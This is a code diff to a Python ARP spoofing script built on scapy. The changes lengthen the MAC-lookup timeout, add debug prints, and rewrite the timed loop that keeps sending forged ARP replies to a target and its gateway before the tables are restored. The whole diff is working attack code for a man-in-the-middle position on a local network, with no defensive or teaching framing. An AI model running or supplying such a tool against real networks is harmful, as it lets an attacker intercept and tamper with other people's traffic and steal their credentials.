@@ -9,8 +9,11 @@ def scan(target_ip):
     arp_request = scapy.ARP(pdst = target_ip)
     broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
-    answered = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)
-
+    answered = scapy.srp(arp_request_broadcast, timeout = 3, verbose = False)
+    print(answered[0])
+    print(len(answered[0]))
+    print(type(answered[0]))
+    print(answered[0][1])
     return answered[0][1].hwsrc
 
 def arpspoof(target, gateway):
@@ -34,18 +37,17 @@ def get_arguements():
 
 def run(target, gateway, duration_seconds):
     end_time = time.time() + duration_seconds
-
+    print(end_time)
     count = 2
     try:
-        while time.time() < end_time:
+        while True:
             arpspoof(target, gateway)
             arpspoof(gateway, target)
             print("\r\033[1;35m[+] packets sent = \033[0m" + str(count), end = "")
             count += 2
-            remaining = end_time - time.time()
-            if remaining <= 0:
+            if time.time() >= end_time:
                 break
-            time.sleep(min(2, remaining))
+            time.sleep(2)
     finally:
         restore(target, gateway)
 
